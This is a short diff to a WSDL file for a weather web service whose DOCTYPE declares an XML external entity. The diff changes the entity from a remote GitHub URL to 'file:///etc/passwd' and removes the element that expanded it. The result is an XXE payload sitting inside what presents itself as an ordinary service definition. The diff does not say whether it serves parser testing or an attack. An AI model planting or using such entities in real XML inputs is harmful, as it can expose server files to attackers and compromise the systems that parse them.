@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [
-<!ENTITY xxe SYSTEM "https://github.com/akshatmahla/xxe/blob/main/xxe2.xml">
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <wsdl:definitions xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"
 	xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/"
@@ -8,7 +8,6 @@
 	xmlns:s="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/"
 	xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
 	targetNamespace="http://www.webserviceX.NET">
-	<example>&xxe;</example>
 	<wsdl:types>
 		<s:schema elementFormDefault="qualified" targetNamespace="http://www.webserviceX.NET">
 			<s:element name="GetWeather">
